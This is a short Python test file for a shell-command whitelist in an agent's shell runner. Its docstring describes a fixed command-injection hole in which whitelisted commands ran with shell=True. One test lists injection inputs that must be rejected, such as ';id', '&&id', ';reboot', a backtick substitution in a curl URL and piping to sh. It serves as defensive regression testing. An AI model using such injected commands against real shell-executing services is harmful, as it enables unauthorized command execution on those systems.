"""Practice 108 (owner 16 Nov 2026): HB's older shell routes (/api/shell/execute, /api/shell/stream) and the agent shell runner execute a
whitelist match with shell=True, and patterns like "cat /var/log/<any text>" let "cat /var/log/x;id" through - the shell then also ran "id".
A whitelist match can no longer carry shell syntax."""
from fridays.shell_agent import _match_whitelist


def test_practice_108_chained_commands_never_match():
    for bad in ('cat /var/log/syslog;id', 'tail /var/log/syslog&&id', 'ping -c 1 x;reboot', 'curl -s https://x.example/`id`',
                'ps aux | grep x;id', 'ps aux | grep x | sh', 'cat /var/log/syslog > /tmp/out', 'ls $HOME', 'df -h\nid'):
        assert _match_whitelist(bad) is None, bad


def test_practice_108_plain_commands_still_match():
    for good in ('df -h', 'free -h', 'ps aux', 'ps aux | grep python', 'cat /var/log/syslog', 'journalctl -u apex-server.service -n 50',
                 'python3 scripts/db_query.py "SELECT 1;"'):
        assert _match_whitelist(good) is not None, good
